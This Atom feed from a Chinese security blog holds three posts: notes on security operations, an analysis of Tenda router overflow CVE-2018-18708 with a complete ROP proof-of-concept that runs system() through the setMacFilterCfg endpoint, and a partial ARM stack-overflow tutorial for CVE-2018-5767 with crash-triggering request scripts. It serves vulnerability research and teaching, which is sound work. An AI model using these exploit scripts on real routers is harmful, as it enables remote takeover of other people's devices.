<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>YYF&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-08-29T17:50:49.134Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>qingxp9</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>yyf学习笔记（一）：安全运营</title>
    <link href="http://yoursite.com/2020/studynotes1_so/"/>
    <id>http://yoursite.com/2020/studynotes1_so/</id>
    <published>2020-08-29T17:48:26.000Z</published>
    <updated>2020-08-29T17:50:49.134Z</updated>
    
    <content type="html"><![CDATA[<p>一个领域20%的核心内容能解决该领域80%的问题，而如何找到这20%的核心就需要该领域的专家来指点。</p><p>本系列文章是我对不熟悉领域的学习笔记，首要动机是通过对外分享的“负重感”给自己一些动力，其次以笔记的形式对知识内容进行结构化总结，便于大脑归档记忆。</p><p>本期学习的目标是来自lake2前不久分享的一篇文章<a href="https://mp.weixin.qq.com/s/rc6X5SlsoRp6s7RCEZ67mA" target="_blank" rel="noopener">《小步快跑，快速迭代：安全运营的器术法道》</a>。</p><hr><p>文章开始，作者指出在安全运营领域内存在一个广泛的误区： 在进行安全体系建设工作时，人们偏向于去研发新系统，因为这样工作的成果更容易被“看见”。而现实并不存在着能一劳永逸解决问题的系统/新技术，还需要配合安全运营的工作进行迭代优化，才能逐步真正解决安全问题。</p><p>因此，作者抛出了一个观点：“安全系统研发完成投入使用是解决了从无到有的问题，是万里长征第一步，而之后的安全运营工作才是从有到优的不断升级之路”。</p><p>随后，正文就“安全运营是什么”、“如何衡量安全运营工作的好坏”、“安全运营的方法论与实践”三方面进行展开探讨。</p><h2 id="1-安全运营是什么"><a href="#1-安全运营是什么" class="headerlink" title="1.安全运营是什么"></a>1.安全运营是什么</h2><p>作者认为，安全运营实际上就是“使用系统、发现问题、解决问题”。通过使用安全系统，在过程中发现系统和策略的问题，分析问题迭代优化，最终达成完美解决安全问题的目标。</p><p>作者还强调到：安全运营是一个“三分技术、七分管控”的活，很多时候问题并不单是技术问题，还可能是工程问题、沟通问题、合作问题和推动问题。</p><h2 id="2-如何衡量安全运营工作的好坏"><a href="#2-如何衡量安全运营工作的好坏" class="headerlink" title="2.如何衡量安全运营工作的好坏"></a>2.如何衡量安全运营工作的好坏</h2><p>作者认为要做好安全运营工作至少得保证：</p><ul><li>有衡量指标，如系统覆盖率（安全系统对被保护对象的覆盖比率）、策略漏报率/误报率等。</li><li>需要通过实战检验真实的防护能力。</li><li>做好数据运营分析，利用漏洞/安全事件进行复盘，持续迭代优化安全系统。</li></ul><h2 id="3-安全运营的方法论和实践"><a href="#3-安全运营的方法论和实践" class="headerlink" title="3.安全运营的方法论和实践"></a>3.安全运营的方法论和实践</h2><p>在这一部分，作者从自身的经历和理解出发，总结出了一些安全运营方法论。我将之浓缩如下：</p><ul><li>关注落地，解决实际问题</li><li>抓大放小，抓准主要矛盾</li><li>控制增量，先增量后存量</li><li>原生安全，出厂默认安全</li><li>灰度放量，策略灰度发布</li><li>群策群力，协同业务参与</li><li>借力复盘，观外例审自身</li><li>不断学习，紧跟技术发展</li><li>纵深防御，策略多维设防</li><li>关注未知，保持敬畏之心</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一个领域20%的核心内容能解决该领域80%的问题，而如何找到这20%的核心就需要该领域的专家来指点。&lt;/p&gt;
&lt;p&gt;本系列文章是我对不熟悉领域的学习笔记，首要动机是通过对外分享的“负重感”给自己一些动力，其次以笔记的形式对知识内容进行结构化总结，便于大脑归档记忆。&lt;/p&gt;

      
    
    </summary>
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="安全运营" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-18708：Tenda路由器缓冲区溢出漏洞分析</title>
    <link href="http://yoursite.com/2020/tenda_CVE-2018-18708/"/>
    <id>http://yoursite.com/2020/tenda_CVE-2018-18708/</id>
    <published>2020-05-04T10:34:12.000Z</published>
    <updated>2020-08-29T17:51:33.370Z</updated>
    
    <content type="html"><![CDATA[<p>首发于：<a href="https://www.anquanke.com/post/id/204403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/204403</a></p><p>摘要：本文通过对一个ARM路由器缓冲区溢出漏洞的分析，实践逆向数据流跟踪的思路与方法。</p><p>假设读者：了解ARM指令集基础知识、了解栈溢出原理和利用方法、了解通过IDA和GDB进行静态分析与动态跟踪的方法。</p><p>阅读本文后：可以了解逆向数据流跟踪的思路与方法</p><h2 id="1-漏洞概要"><a href="#1-漏洞概要" class="headerlink" title="1. 漏洞概要"></a>1. 漏洞概要</h2><p>CVE-2018-18708，多款Tenda产品中的httpd存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（覆盖函数的返回地址）。以下产品和版本受到影响：Tenda AC7 V15.03.06.44_CN版本；AC9 V15.03.05.19(6318)_CN版本；AC10 V15.03.06.23_CN版本；AC15 V15.03.05.19_CN版本；AC18 V15.03.05.19(6318)_CN版本。<br><img src="/images/15885711163650.jpg" alt="-w850"></p><p>对于该漏洞，并未搜索到现有的漏洞分析文章，漏洞提交者仅通过上图指出漏洞所在的地方，剩下的如何触发利用就需要我们来跟踪分析了。</p><p>测试环境：Kali 2020 5.4.0-kali3-amd64<br>固件下载地址：<a href="https://down.tenda.com.cn/uploadfile/AC15/US_AC15V1.0BR_V15.03.05.19_multi_TD01.zip" target="_blank" rel="noopener">https://down.tenda.com.cn/uploadfile/AC15/US_AC15V1.0BR_V15.03.05.19_multi_TD01.zip</a></p><h2 id="2-固件模拟"><a href="#2-固件模拟" class="headerlink" title="2. 固件模拟"></a>2. 固件模拟</h2><p>qemu模拟运行bin/httpd文件时，sub_2E420函数中会检测网络，需要在下图标号1和标号2处对返回值进行patch进行绕过。</p><p><img src="/images/15886713831626.jpg" alt=""><br>同时添加并配置虚拟网桥br0，如此就能跑起来了。<br><img src="/images/15886715503342.jpg" alt="-w776"></p><h2 id="3-跟踪与分析"><a href="#3-跟踪与分析" class="headerlink" title="3. 跟踪与分析"></a>3. 跟踪与分析</h2><p>分析一般有两种思路：</p><ul><li>正向数据流跟踪：从输入函数开始跟踪数据处理逻辑。</li><li>逆向数据流跟踪：从操作函数反向跟踪参数的数据流，找到源缓冲区和目的缓冲区。</li></ul><p>因为我们已经知道了目标漏洞代码的位置，这里采用逆向数据流跟踪的方式。根据图中的字符串，检索到代码位于sub_c24C0中。</p><h3 id="3-1-梳理函数调用关系"><a href="#3-1-梳理函数调用关系" class="headerlink" title="3.1 梳理函数调用关系"></a>3.1 梳理函数调用关系</h3><p>在我们之前解决网络问题时程序已经执行到了sub_2E420函数，而溢出点位于sub_c24C0函数。因此我们将这中间的函数调用过程都梳理出来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_C24C0 &lt;- sub_C17A0 &lt;- sub_C14DC &lt;- formSetMacfiltercfg &lt;- sub_42378 &lt;- sub_2E9EC &lt;- sub_2E420</span><br></pre></td></tr></table></figure></p><h3 id="3-2-跟踪参数来源"><a href="#3-2-跟踪参数来源" class="headerlink" title="3.2 跟踪参数来源"></a>3.2 跟踪参数来源</h3><p>跟踪梳理出漏洞代码strcpy函数中源地址s的来源。<br>（1）源地址s来源于sub_C24C0的a1参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sub_C24C0(a1,a2)&#123;</span><br><span class="line">    dest = a2</span><br><span class="line">    s = a1</span><br><span class="line">    src = a1中的&apos;\r&apos;位置</span><br><span class="line">    if (src)&#123;</span><br><span class="line">        strcpy(dest +32, s)</span><br><span class="line">        strcpy(dest, src)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>（2）sub_C24C0的a1参数来源于sub_C17A0的a2参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sub_C17A0(a1, a2, a3)&#123;</span><br><span class="line">    v5=a2</span><br><span class="line">    v21为本地变量 160字节</span><br><span class="line">    sub_C24C0(v5, v21)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>（3）sub_C17A0的a2参数来源于sub_C14DC的a2参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sub_C14DC(a1, a2)&#123;</span><br><span class="line">s = a2</span><br><span class="line">if(*s)&#123;</span><br><span class="line">    sub_C17A0(v4, s, v16)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>（4）sub_C14DC的a2参数来源于formSetMacFilterCfg函数的v39<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">formSetMacFilterCfg()&#123;</span><br><span class="line">    v40 = sub_2BA8C(v3, &quot;macFilterType&quot;, &amp;unk_F5124) </span><br><span class="line">    v41 = sub_C10D0(V40)</span><br><span class="line">    if (not v41)&#123;</span><br><span class="line">        v39 = sub_2BA8C(v3, &quot;deviceList&quot;, &amp;unk_F5124) </span><br><span class="line">        sub_C14DC(v40, v39)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>变量v39是<figure class="highlight plain"><figcaption><span>"deviceList", &unk_F5124)```函数的返回值。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">由此可以判断出，程序获取到HTTP请求中deviceList的值，并一路传递到sub_c24C0函数的漏洞点。</span><br><span class="line">### 3.3 路径中的分支跳转条件</span><br><span class="line">之前得到了函数调用关系：</span><br><span class="line">sub_C24C0 &lt;- sub_C17A0 &lt;- sub_C14DC &lt;- formSetMacfiltercfg &lt;- sub_42378 &lt;- sub_2E9EC &lt;- sub_2E420</span><br><span class="line"></span><br><span class="line">我们需要对路径中的分支跳转判断条件一一满足，这里配合使用IDA的Graph视图、反编译和GDB动态调试来完成分析。</span><br><span class="line"></span><br><span class="line">（1）sub_2E9EC &lt;- sub_2E420</span><br><span class="line">网络检测后，无分支。</span><br><span class="line">（2）sub_42378 &lt;- sub_2E9EC</span><br><span class="line">有分支判断，但已经满足。</span><br><span class="line"></span><br><span class="line">（3）formSetMacfiltercfg &lt;- sub_42378</span><br><span class="line">![](/images/15886748722712.jpg)</span><br><span class="line">如上图，该函数中有对不同功能的处理函数。显然请求到指定路径，会调用相应的处理函数，我们得找到执行formSetMacfiltercfg函数的路径。</span><br><span class="line"></span><br><span class="line">在函数中没有找到url路径相关的信息，翻了下固件文件系统，发现了```webroot_ro/goform/setMacFilterCfg.txt```文件。</span><br><span class="line"></span><br><span class="line">通过gdb下断点确定访问“/goform/setMacFilterCfg”时会进入formSetMacfiltercfg函数。</span><br><span class="line"></span><br><span class="line">（4）sub_C14DC &lt;- formSetMacfiltercfg</span><br><span class="line">![](/images/15886764409149.jpg)</span><br><span class="line">如上图，需要让v41=0，而v41来自于sub_C10D0函数对macFilterType的参数的处理。</span><br><span class="line"></span><br><span class="line">我们进入sub_C10D0函数看看macFilterType需要如何设置，反编译后代码逻辑还是很清晰的，只需要v3等于“black”或“white”即可返回0，如下图所示。</span><br><span class="line">![](/images/15886496980438.jpg)</span><br><span class="line"></span><br><span class="line">进入目标分支后，再从deviceList获取传入v39变量，根据上一节的分析该值将被用作strcpy的参数。</span><br></pre></td></tr></table></figure></p><p>data = {“macFilterType”: “white”, “deviceList”: payload}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">（5）sub_C17A0 &lt;- sub_C14DC</span><br><span class="line">有分支判断，但条件已满足。</span><br><span class="line">（6）sub_C24C0 &lt;- sub_C17A0</span><br><span class="line">有分支判断，但条件已满足。</span><br><span class="line">（7）sub_C24C0</span><br><span class="line">如下图所示，检测deviceList内容是否包含&apos;\r&apos;，随后进入分支执行漏洞代码。</span><br><span class="line">![](/images/15886823208317.jpg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 3.4 溢出触发测试</span><br><span class="line">根据上一节的分析，我们整理处HTTP POST的请求内容。</span><br></pre></td></tr></table></figure></p><p>import requests</p><p>url = “<a href="http://192.168.2.111/goform/setMacFilterCfg&quot;" target="_blank" rel="noopener">http://192.168.2.111/goform/setMacFilterCfg&quot;</a><br>cookie = {“Cookie”:”password=12345”}<br>data = {“macFilterType”: “white”, “deviceList”: “\r”+ “A”*500}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">发送后，gdb得到预想中的报错信息，返回地址被覆盖。</span><br><span class="line">![-w558](/images/15886630039130.jpg)</span><br><span class="line"></span><br><span class="line">## 4.漏洞利用</span><br><span class="line">（1）寻找偏移量</span><br><span class="line">利用cyclic找到偏移量</span><br><span class="line">![-w703](/images/15886634147044.jpg)</span><br><span class="line"></span><br><span class="line">这里记得检查下CPSR寄存器的T位，因为栈上内容弹出到PC寄存器时，其最低有效位（LSB）将被写入CPSR寄存器的T位，而PC本身的LSB被设置为0。如果T位值为1，需要在地址上加一还原。</span><br><span class="line"></span><br><span class="line">![-w354](/images/15886635848371.jpg)</span><br><span class="line"></span><br><span class="line">（2）确定利用方案</span><br><span class="line">使用checksec检查二进制文件的保护措施，开启了NX保护，选择用ROP绕过。</span><br><span class="line">![-w769](/images/15886640578587.jpg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">（3）构造ROP Chain</span><br><span class="line">获取libc.so基地址。</span><br><span class="line">![-w978](/images/15886639444818.jpg)</span><br><span class="line">获取system函数偏移量。</span><br><span class="line">![-w771](/images/15886698544187.jpg)</span><br><span class="line">寻找gadets。</span><br></pre></td></tr></table></figure></p><p>ROPgadget –binary ./lib/libc.so.0  | grep “mov r0, sp”<br>0x00040cb8 : mov r0, sp ; blx r3</p><p>ROPgadget –binary ./lib/libc.so.0 –only “pop”| grep r3<br>0x00018298 : pop {r3, pc}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最终，payload结构为[offset, gadget1, system_addr, gadget2, cmd] ，完整的POC如下：</span><br></pre></td></tr></table></figure></p><p>import requests<br>from pwn import *</p><p>cmd=”echo hello”<br>libc_base = 0xff58c000<br>system_offset = 0x5a270<br>gadget1_offset = 0x18298<br>gadget2_offset = 0x40cb8<br>system_addr = libc_base + system_offset<br>gadget1 = libc_base + gadget1_offset<br>gadget2 = libc_base + gadget2_offset</p><p>payload = “A”*176 + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd</p><p>url = “<a href="http://192.168.2.111/goform/setMacFilterCfg&quot;" target="_blank" rel="noopener">http://192.168.2.111/goform/setMacFilterCfg&quot;</a><br>cookie = {“Cookie”:”password=12345”}<br>data = {“macFilterType”: “white”, “deviceList”: “\r”+payload}<br>requests.post(url, cookies=cookie, data=data)<br><code>`</code></p><p>查看程序的打印信息，cmd中的echo指令已经被执行。<br><img src="/images/15886704513063.jpg" alt="-w317"></p><p>PS：中间有些细节省略掉了，只给出了关键步奏。如果看不明白，可以参考之前写的文章《写给初学者的实战教程之ARM栈溢出》，分析的是同一款路由器的其他漏洞。</p><p>##参考</p><p><a href="https://github.com/ZIllR0/Routers/blob/master/Tenda/stack1.md" target="_blank" rel="noopener">https://github.com/ZIllR0/Routers/blob/master/Tenda/stack1.md</a><br><a href="https://www.anquanke.com/vul/id/1375399" target="_blank" rel="noopener">https://www.anquanke.com/vul/id/1375399</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首发于：&lt;a href=&quot;https://www.anquanke.com/post/id/204403&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/204403&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;摘
      
    
    </summary>
    
      <category term="技术" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="ARM" scheme="http://yoursite.com/tags/arm/"/>
    
      <category term="IoT" scheme="http://yoursite.com/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>写给初学者的实战教程之ARM栈溢出</title>
    <link href="http://yoursite.com/2020/IoT-arm-stackoverflow-guide/"/>
    <id>http://yoursite.com/2020/IoT-arm-stackoverflow-guide/</id>
    <published>2020-05-04T09:34:12.000Z</published>
    <updated>2020-08-29T17:51:57.189Z</updated>
    
    <content type="html"><![CDATA[<p>首发于：<a href="https://www.anquanke.com/post/id/204326" target="_blank" rel="noopener">https://www.anquanke.com/post/id/204326</a></p><p>本文面向入门IoT固件分析的安全研究员，以一款ARM路由器漏洞为例详细阐述了分析过程中思路判断，以便读者复现及对相关知识的查漏补缺。</p><p>假设读者：了解ARM指令集基础知识、了解栈溢出原理和基础利用方法、了解IDA、GDB基础使用方法，但缺少实战漏洞分析经验。</p><p>阅读本文后：</p><ol><li>可以知道IoT固件仿真的基础方法及排错思路。</li><li>可以知道在获取溢出偏移量时，Thumb模式对PC写入值的影响。</li><li>可以知道对ARM架构栈溢出的ROP利用方法和调试方法。</li></ol><p>为方便大家学习复现，会尽量将过程中的每一个分析思路进行阐述。</p><p>##1.实验目标概述<br>为了便于实验，选择一个可以模拟的路由器固件：Tenda AC15 15.03.1.16_multi。分析的漏洞为CVE-2018-5767，是一个输入验证漏洞，远程攻击者可借助COOKIE包头中特制的‘password’参数利用该漏洞执行代码。</p><p>测试环境：Kali 2020 5.4.0-kali3-amd64<br>固件下载地址：<a href="https://down.tenda.com.cn/uploadfile/AC15/US_AC15V1.0BR_V15.03.1.16_multi_TD01.zip" target="_blank" rel="noopener">https://down.tenda.com.cn/uploadfile/AC15/US_AC15V1.0BR_V15.03.1.16_multi_TD01.zip</a></p><p>##2.固件仿真<br>首先使用binwalk导出固件文件系统，并通过ELF文件的头信息判断架构，得知为32位小端ARM。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me US_AC15V1.0BR_V15.03.1.16_multi_TD01.zip</span><br><span class="line">readelf -h bin/busybox</span><br></pre></td></tr></table></figure></p><p><img src="/images/15883512910078.jpg" alt="-w675"></p><p>使用对应的qemu程序（qemu-arm-static），配合chroot启动待分析的目标文件bin/httpd。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#安装qemu和arm的动态链接库</span><br><span class="line">sudo apt install qemu-user-static libc6-arm* libc6-dev-arm*</span><br><span class="line">cp $(which qemu-arm-static) .</span><br><span class="line"></span><br><span class="line">sudo chroot ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></table></figure></p><p>此时发现卡在了如下图的显示，同时检查80端口也并未开启。<br><img src="/images/15883514886903.jpg" alt=""></p><p>根据打印的信息“/bin/sh: can’t create /proc/sys/kernel/core_pattern: nonexistent directory”，创建相应目录<figure class="highlight plain"><figcaption><span>-p ./proc/sys/kernel```。同时在ida中通过Strings视图搜索“Welcome to”字符串，通过交叉引用找到程序执行的上下文。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">![](//images//15883515565859.jpg)</span><br><span class="line">可以看到有不同的分支方向，简单分析梳理一下分支的判断条件。在上图中的标号1处，执行check_network函数后会检测返回值（保存在R0中），小于等于零时将执行左侧分支。可以观察到会进行sleep并跳回loc_2CF84形成一个循环。</span><br><span class="line"></span><br><span class="line">可以猜测因为模拟环境某些元素的缺失导致了检测失败。此处我们对程序进行patch，将其中的比较的指令```MOV R3, R0```修改为```MOV R3, 1```，从而强制让程序进入右侧分支。</span><br><span class="line"></span><br><span class="line">借用rasm2工具翻译汇编指令到机器指令，通过IDA原始功能修改即可（展开Edit-Patch program-Change byte进行修改）。</span><br><span class="line">![](/images/15883517902317.jpg)</span><br><span class="line">![](/images/15883518542967.jpg)</span><br><span class="line"></span><br><span class="line">此时运行程序会发现还是会卡住，继续观察上下文代码段，发现在下图中的标号2处对ConnectCfm函数返回值也进行了判断。采取同样的套路进行patch，这里不再赘述。</span><br><span class="line">![](/images/15883519333237.jpg)</span><br><span class="line"></span><br><span class="line">修改完好保存patch文件（展开Edit-Patch program-Apply patches to input file），并再次运行程序。</span><br><span class="line">![](/images/15883519955744.jpg)</span><br><span class="line">![](/images/15883520549621.jpg)</span><br><span class="line"></span><br><span class="line">可以看到程序打印显示正在监听80端口，但ip地址不对。此时需要我们配置下网络，建立一个虚拟网桥br0，并再次运行程序。</span><br></pre></td></tr></table></figure></p><p>sudo apt install uml-utilities bridge-utils<br>sudo brctl addbr br0<br>sudo brctl addif br0 eth0<br>sudo ifconfig br0 up<br>sudo dhclient br0<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">![](/images/15883520811762.jpg)</span><br><span class="line">此时，IP为本机的真实地址，实验环境就配好了。</span><br><span class="line"></span><br><span class="line">##3.漏洞分析</span><br><span class="line">根据CVE的描述以及公开POC的信息，得知溢出点在R7WebsSecurityHandler函数中。ida可以直接按f5反编译arm架构的代码。</span><br><span class="line">![](/images/15883526225395.jpg)</span><br><span class="line">分析后得知，程序首先找到“password=”字符串的位置，通过sscanf函数解析从“=”号到“；”号中间的内容写入v35。这里没有对用户可控的输入进行过滤，从而有机会覆盖堆栈劫持程序流。</span><br><span class="line"></span><br><span class="line">为了让程序执行到此处，我们得满足前面的分支条件，见下图：</span><br><span class="line">![](/images/15883528087293.jpg)</span><br><span class="line">我们需要保证请求的url路径不会导致if语句为false，比如“/goform/xxx”就行。</span><br><span class="line"></span><br><span class="line">现在进行简单的溢出尝试，开启调试运行程序```sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd```，并另开终端用gdb连上远程调试。</span><br></pre></td></tr></table></figure></p><p>gdb-multarch ./bin/httpd<br>target remote :1234<br>continue<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用python requests库来构造HTTP请求，代码如下：</span><br></pre></td></tr></table></figure></p><p>import requests<br>url = “<a href="http://192.168.2.108/goform/xxx&quot;" target="_blank" rel="noopener">http://192.168.2.108/goform/xxx&quot;</a><br>cookie = {“Cookie”:”password=”+”A”*1000}<br>requests.get(url=url, cookies=cookie)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP请求发送后，gdb捕捉到错误。如下图所示，有几项寄存器被写入了“AAAA“。但仔细一看出错的地方并不是函数返回处，而是一个“从不存在的地址取值”造成的报错，这样目前就只能造成拒绝服务，而不能执行命令。</span><br><span class="line">![](/images/15883530334030.jpg)</span><br><span class="line"></span><br><span class="line">gdb输入```bt```查看调用路径，跟踪0x0002c5cc,发现位于sub_2C568函数中，而该函数在我们缓冲区溢出后将被执行。</span><br><span class="line">![](/images/15883531927658.jpg)</span><br><span class="line"></span><br><span class="line">整理一下，我们想要缓冲区溢出后函数返回以劫持程序流，但现在被中间一个子函数卡住了。观察从溢出点到该子函数中间的这段代码，发现有个机会可以直接跳转到函数末尾。</span><br><span class="line">![](/images/15883534184475.jpg)</span><br><span class="line">如上图中的if语句，只要内容为flase就可以达到目的。这段代码寻找“.”号的地址，并通过memcmp函数判断是否为“gif、png、js、css、jpg、jpeg”字符串。比如存在“.png”内容时，```memcmp(v44, &quot;png&quot;, 3u)```的返回值为0，if语句将失败。</span><br><span class="line"></span><br><span class="line">而这段字符串的读取地址正好位于我们溢出覆盖的栈空间中，所以在payload的尾部部分加入该内容即可。于此同时，我们使用cyclic来帮助判断到返回地址处的偏移量。</span><br></pre></td></tr></table></figure></p><p>import requests<br>url = “<a href="http://192.168.2.108/goform/xxx&quot;" target="_blank" rel="noopener">http://192.168.2.108/goform/xxx&quot;</a><br>cookie = {“Cookie”:”password=”+”aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae”+ “.png”}<br>requests.get(url=url, cookies=cookie)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">崩溃信息如下图所示。</span><br><span class="line">![-w756](/images/15883986519075.jpg)</span><br><span class="line"></span><br><span class="line">*需要特别注意*，崩溃的返回地址显示是0x6561616c(&apos;laae&apos;)，我们还需要观察CPSR寄存器的T位进行判断，CPSR寄存器的标志位如下图所示。</span><br><span class="line">![](/images/15884026944920.jpg)</span><br><span class="line"></span><br><span class="line">这里涉及到ARM模式（LSB=0）和Thumb模式（LSB=1）的切换，栈上内容弹出到PC寄存器时，其最低有效位（LSB）将被写入CPSR寄存器的T位，而PC本身的LSB被设置为0。此时在gdb中执行```p/t $cpsr```以二进制格式显示CPSR寄存器。如下图所示，发现T位值为1，因此需要在之前报错的地址上加一还原为0x6561616f(&apos;maae&apos;)。</span><br><span class="line">![-w362](/images/15884029131826.jpg)</span><br><span class="line"></span><br><span class="line">在我看到的几篇该漏洞分析文章都忽略了这一点导致得到错误偏移量。我们可以在函数最后返回的pop指令处（0x2ed18）下断点进行辅助判断。如下图所示，可以看到PC原本将被赋值为“maae”。因此偏移量为448。</span><br><span class="line">![](/images/15883537939960.jpg)</span><br><span 